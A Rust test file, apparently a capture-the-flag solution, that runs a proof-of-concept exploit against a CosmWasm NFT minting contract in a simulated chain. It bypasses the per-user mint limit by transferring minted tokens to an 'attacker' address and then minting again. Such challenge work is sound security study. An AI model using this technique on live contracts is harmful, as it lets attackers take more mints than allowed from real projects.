#[cfg(test)]
pub mod tests {
    use cosmwasm_std::{Addr, Empty};
    use cw721::TokensResponse;
    use cw_multi_test::Executor;

    use crate::{
        integration_tests::tests::{proper_instantiate, USER1},
        msg::{ExecuteMsg, QueryMsg},
        state::Config,
    };
    use cw721_base::{ExecuteMsg as Cw721ExecuteMsg, QueryMsg as Cw721QueryMsg};

    pub const ATTACKER: &str = "awesomwasm";

    #[test]
    fn exploit() {
        let (mut app, contract_addr) = proper_instantiate();

        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
            .unwrap();
        assert_eq!(config.mint_per_user, 3);

        // mint until max limit
        for _ in 0..config.mint_per_user {
            app.execute_contract(
                Addr::unchecked(USER1),
                contract_addr.clone(),
                &ExecuteMsg::Mint {},
                &[],
            )
            .unwrap();
        }

        // minting one more is not allowed
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap_err();

        // transfer all nfts to another address
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
            .unwrap();

        let tokens_res: TokensResponse = app
            .wrap()
            .query_wasm_smart(
                config.nft_contract.clone(),
                &Cw721QueryMsg::Tokens::<Empty> {
                    owner: USER1.to_owned(),
                    start_after: None,
                    limit: None,
                },
            )
            .unwrap();

        for token_id in tokens_res.tokens {
            app.execute_contract(
                Addr::unchecked(USER1),
                config.nft_contract.clone(),
                &Cw721ExecuteMsg::TransferNft::<Empty, Empty> {
                    recipient: ATTACKER.to_owned(),
                    token_id: token_id.to_string(),
                },
                &[],
            )
            .unwrap();
        }

        // can mint again even though exceeded limit
        for _ in 0..config.mint_per_user {
            app.execute_contract(
                Addr::unchecked(USER1),
                contract_addr.clone(),
                &ExecuteMsg::Mint {},
                &[],
            )
            .unwrap();
        }
    }
}
